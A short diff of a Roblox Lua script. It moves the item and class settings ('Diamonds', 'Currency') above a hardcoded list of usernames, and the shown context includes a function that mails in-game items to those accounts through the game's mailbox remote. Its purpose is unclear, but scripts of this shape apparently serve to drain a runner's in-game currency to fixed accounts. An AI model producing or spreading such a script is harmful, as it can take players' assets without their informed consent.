@@ -1,3 +1,5 @@
+local itemname = "Diamonds"
+local classname = "Currency"  -- String needs to be in quotes
 local usernamesString = [[
 NebulaKnight6497
 EclipseTalon1094
@@ -18,8 +20,7 @@ local function sendMail(username, item, id, amount)
     game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
     wait(0.5)
 end
-local itemname = "Diamonds"
-local classname = "Currency"  -- String needs to be in quotes
+
 
 local RS = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
